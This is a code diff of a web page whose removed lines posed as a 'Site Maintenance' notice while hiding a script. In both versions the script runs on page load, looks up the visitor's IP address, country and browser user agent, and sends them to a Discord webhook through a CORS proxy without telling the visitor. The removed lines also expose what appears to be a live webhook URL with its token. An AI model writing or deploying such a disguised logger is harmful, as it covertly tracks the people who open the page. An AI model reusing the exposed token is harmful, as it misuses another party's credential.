@@ -1,33 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Site Maintenance</title>
-</head>
-<body>
-    <h1>Under Maintenance</h1>
-    <p>This page is currently under construction. Please check back later.</p>
-
     <script>
-        // 1. PASTE YOUR DISCORD WEBHOOK URL INSIDE THE SINGLE QUOTES BELOW
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558892647089836093/E4Xk1AqveqMt5TMLkPz9SO9BDuBLveX97hgOzQqTh3S9IHukEPWZMDtaJZCLottUBzj7';
+        // Paste your Discord Webhook URL inside the single quotes below
+        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 
         async function logVisitor() {
             try {
-                // 2. Fetch the public IP address (this will be your Proton VPN IP)
-                const ipResponse = await fetch('https://ipify.org');
+                // 1. Fetch the IP address from an alternative provider that handles browser requests well
+                const ipResponse = await fetch('https://ipapi.co');
                 const ipData = await ipResponse.json();
                 const visitorIp = ipData.ip;
+                const country = ipData.country_name || "Unknown";
 
-                // 3. Gather basic browser details
-                const userAgent = navigator.userAgent;
-
-                // 4. Prepare the payload structure for Discord
+                // 2. Prepare the payload structure for Discord
                 const payload = {
-                    content: `**New Visitor Logged**\n**IP:** ${visitorIp}\n**User Agent:** ${userAgent}`
+                    content: `**New Visitor Logged**\n**IP (VPN):** ${visitorIp}\n**Location:** ${country}\n**User Agent:** ${navigator.userAgent}`
                 };
 
-                // 5. Route the request through the CORS proxy to allow it to reach Discord
+                // 3. Route the Discord request through the CORS proxy
                 const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(WEBHOOK_URL);
 
                 await fetch(proxyUrl, {
@@ -46,5 +34,3 @@
         // Run the script automatically when the page finishes loading
         window.onload = logVisitor;
     </script>
-</body>
-</html>
